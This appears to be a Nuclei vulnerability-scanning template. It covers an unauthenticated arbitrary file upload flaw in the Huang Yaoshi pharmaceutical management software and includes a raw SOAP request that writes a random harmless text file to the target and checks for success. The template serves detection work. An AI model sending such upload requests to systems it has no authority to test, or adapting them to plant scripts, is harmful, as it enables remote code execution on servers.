id: huang-yaoshi-file-upload

info:
  name: Huang Yaoshi Pharmaceutical Management Software - Arbitrary File Upload
  author: kosoyyagent
  severity: critical
  description: |
    The Huang Yaoshi pharmaceutical management software exposes an unauthenticated UploadFile method under /XSDService.asmx that writes attacker-controlled content to an attacker-controlled path and filename. A remote attacker can upload arbitrary files, including executable .asp scripts, and gain code execution on the server.
  reference:
    - https://github.com/advisories/GHSA-66fj-74pq-7rwx
  classification:
    cwe-id: CWE-434
  metadata:
    max-request: 1
    vendor: huangyaoshi
    product: huang_yaoshi
  tags: fileupload,rce,aspx,intrusive,vuln

http:
  - raw:
      - |
        POST /XSDService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/UploadFile"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadFile xmlns="http://tempuri.org/">
              <filePath></filePath>
              <fileName>{{rand_base(8)}}.txt</fileName>
              <buffer>aGVsbG8gd29ybGQ=</buffer>
              <Offset>1111</Offset>
            </UploadFile>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<?xml'
          - 'UploadFileResult'
        condition: and

      - type: status
        status:
          - 200
